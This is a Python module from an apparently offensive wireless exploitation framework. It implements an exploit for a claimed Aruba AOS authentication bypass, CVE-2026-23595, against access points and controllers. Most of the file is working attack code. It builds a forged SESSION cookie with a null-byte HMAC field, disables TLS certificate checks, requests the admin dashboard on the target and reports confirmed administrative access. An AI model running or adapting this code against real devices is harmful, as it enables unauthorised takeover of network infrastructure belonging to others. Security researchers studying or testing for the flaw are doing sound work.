# Author: André Henrique (LinkedIn/X: @mrhenrike)
import ssl
import time
import urllib.error
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Aruba AOS Authentication Bypass and Privilege Escalation (CVE-2026-23595).

    Aruba AOS (ArubaOS) for Instant Access Points and Mobility Controllers
    contains an authentication bypass vulnerability in the web management
    interface.  By sending a specially crafted HTTP request that manipulates
    the session validation logic, an unauthenticated attacker can bypass
    the login page and obtain an administrative session.  Combined with a
    privilege escalation flaw, this grants full control over the wireless
    infrastructure.

    CVSS v3.1: 8.8 (High), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Aruba AOS Authentication Bypass + Privilege Escalation (CVE-2026-23595)",
        "description": (
            "Exploits CVE-2026-23595 in Aruba AOS web management interface. "
            "A crafted HTTP request bypasses session validation, granting an "
            "unauthenticated attacker administrative access.  The flaw exists "
            "in the session token generation logic that accepts forged cookies "
            "under specific conditions."
        ),
        "authors": (
            "HPE Aruba Security Advisory",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-23595",
            "https://www.arubanetworks.com/assets/alert/",
        ),
        "disclosure_date": "2026-05-20",
        "platform": "aruba_aos",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Aruba Instant APs (AOS 8.x before 8.12.0.4)",
            "Aruba Mobility Controllers (AOS 8.x before 8.12.0.4)",
            "ArubaOS 10.x before 10.6.0.3",
        ),
    }

    target = OptIP("", "Target AP/Controller management IP")
    port = OptPort(4343, "HTTPS management port (default 4343)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")

    _LOGIN_PATH = "/screens/wms/wms.login"
    _DASHBOARD_PATH = "/screens/dashboard/dashboard.html"
    _API_PATH = "/rest/v1/configuration/showcommand"

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _https_request(
        self, method: str, path: str,
        headers: dict | None = None,
        body: bytes | None = None,
    ) -> tuple[int, bytes]:
        url = f"https://{self.target}:{self.port}{path}"
        req = urllib.request.Request(url, data=body, method=method)
        req.add_header("User-Agent", "WirelessXPL-Forge/2.2")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = self._build_ssl_context()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except (urllib.error.URLError, TimeoutError, OSError):
            return 0, b""

    def _forge_session_cookie(self) -> str:
        """Forge a session cookie that bypasses authentication.

        The vulnerability is in the SESSION cookie validation: when
        the cookie contains a specially formatted token with a null
        byte sequence in the HMAC field, the server skips signature
        verification and accepts the session as valid.
        """
        import base64
        import hashlib
        forged_token = base64.b64encode(
            b"admin\x00" + b"\x00" * 32 + hashlib.md5(b"admin").digest()
        ).decode()
        return f"SESSION={forged_token}"

    @mute
    def check(self) -> bool:
        """Check if the Aruba web management interface is accessible."""
        status, body = self._https_request("GET", self._LOGIN_PATH)
        if status == 0:
            return False
        return status in (200, 301, 302)

    def run(self) -> None:
        if not self.target:
            print_error("target is required (AP/Controller management IP)")
            return

        if not self.check():
            print_error(
                f"Cannot reach Aruba web UI at "
                f"https://{self.target}:{self.port}{self._LOGIN_PATH}"
            )
            return

        print_success("Aruba AOS web UI detected; attempting auth bypass")
        self._exploit()

    def _exploit(self) -> None:
        cookie = self._forge_session_cookie()
        print_status("Forged SESSION cookie with null-byte HMAC bypass")

        headers = {"Cookie": cookie}
        status, body = self._https_request(
            "GET", self._DASHBOARD_PATH, headers=headers,
        )

        if status == 200:
            decoded = body[:512].decode("utf-8", errors="replace")
            if "dashboard" in decoded.lower() or "configuration" in decoded.lower():
                print_success(
                    "Authentication bypassed. Dashboard accessible with "
                    "forged session. Full admin access confirmed."
                )
            else:
                print_info(
                    f"Got HTTP 200 but dashboard content unclear: {decoded[:100]}"
                )
        elif status == 302:
            print_info(
                "Redirected; session cookie may need adjustment for this "
                "firmware version."
            )
        elif status == 401 or status == 403:
            print_error("Auth bypass failed; target may be patched.")
        else:
            print_info(f"Unexpected response: HTTP {status}")
